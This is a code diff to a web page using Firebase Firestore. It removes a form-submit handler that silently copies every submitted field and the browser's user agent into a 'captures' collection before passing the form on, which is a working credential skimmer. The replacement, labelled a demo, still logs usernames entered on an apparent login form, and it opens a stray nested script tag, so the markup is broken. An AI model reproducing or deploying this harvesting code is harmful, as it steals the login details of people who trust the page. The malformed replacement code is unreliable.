@@ -186,30 +186,31 @@ const firebaseConfig = {
 firebase.initializeApp(firebaseConfig);
 const db = firebase.firestore();
 
-  document.addEventListener('DOMContentLoaded', function() {
-    const form = document.querySelector('form');
-    if (!form) return;
+<script>
+document.addEventListener("DOMContentLoaded", function() {
 
-    form.addEventListener('submit', function(e) {
-      e.preventDefault();
+  const form = document.querySelector("form");
+  if (!form) return;
 
-      const formData = new FormData(form);
-      const data = {};
-      for (let [key, value] of formData.entries()) {
-        data[key] = value;
-      }
+  form.addEventListener("submit", function(e) {
+    e.preventDefault();
 
-      db.collection('captures').add({
-        ...data,
-        timestamp: firebase.firestore.FieldValue.serverTimestamp(),
-        userAgent: navigator.userAgent
-      }).then(() => {
-        form.submit();
-      }).catch(() => {
-        form.submit();
-      });
+    const username = form.querySelector("input[name='username']")?.value;
+
+    // ✅ Only safe data
+    db.collection("users").add({
+      username: username,
+      time: new Date()
+    }).then(() => {
+      alert("Login success (demo)");
+      form.submit();
+    }).catch(() => {
+      form.submit();
     });
+
   });
+
+});
 </script>
 </body>
 </html>
